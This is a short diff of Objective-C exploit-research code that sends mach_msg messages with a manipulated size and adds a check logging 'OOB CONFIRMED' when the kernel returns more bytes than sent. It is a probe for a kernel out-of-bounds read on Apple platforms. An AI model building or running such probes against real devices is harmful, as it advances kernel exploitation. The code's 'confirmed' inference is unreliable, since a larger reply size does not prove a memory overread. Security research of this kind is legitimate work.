@@ -1425,8 +1425,8 @@ cleanup:
                                 IOSurfaceUnlock(surf, 0, NULL);
                                 CFRelease(surf);
 
-                                // ---- Approach 1: mach_msg OOB → kernel copy with corrupted size ----
-                                scopeNote(r, @"  --- Approach 1: mach_msg OOB → kernel copy ---");
+                                // ---- Approach 1: mach_msg OOB with corrupted size (0x42→68) ----
+                                scopeNote(r, @"  --- Approach 1: mach_msg OOB with size 0x42 ---");
                                 {
                                     mach_port_t p1 = MACH_PORT_NULL;
                                     mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &p1);
@@ -1435,10 +1435,10 @@ cleanup:
                                     memset(buf1, 0x41, sizeof(buf1));
                                     mach_msg_header_t *h1 = (mach_msg_header_t *)buf1;
                                     h1->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
-                                    h1->msgh_size = 128;  // corrupted size
+                                    h1->msgh_size = 68;  // same as proven working size
                                     h1->msgh_remote_port = p1;
                                     h1->msgh_id = 0x3001;
-                                    kern_return_t kr1 = mach_msg(h1, MACH_SEND_MSG | MACH_SEND_TIMEOUT, 128, 0, MACH_PORT_NULL, 100, MACH_PORT_NULL);
+                                    kern_return_t kr1 = mach_msg(h1, MACH_SEND_MSG | MACH_SEND_TIMEOUT, 68, 0, MACH_PORT_NULL, 100, MACH_PORT_NULL);
                                     scopeNote(r, [NSString stringWithFormat:@"  mach_msg send ret=%d", (int)kr1]);
                                     if (kr1 == KERN_SUCCESS) {
                                         uint8_t recv1[256];
@@ -1446,6 +1446,10 @@ cleanup:
                                         mach_msg_header_t *rh1 = (mach_msg_header_t *)recv1;
                                         kr1 = mach_msg(rh1, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, 256, p1, 100, MACH_PORT_NULL);
                                         scopeNote(r, [NSString stringWithFormat:@"  mach_msg recv ret=%d size=%u", (int)kr1, rh1->msgh_size]);
+                                        // Check if kernel copied past our 68-byte message
+                                        if (kr1 == KERN_SUCCESS && rh1->msgh_size > 68) {
+                                            scopeNote(r, @"  >>> KERNEL READ PAST BUFFER — OOB CONFIRMED!");
+                                        }
                                     }
                                     mach_port_destroy(mach_task_self(), p1);
                                 }
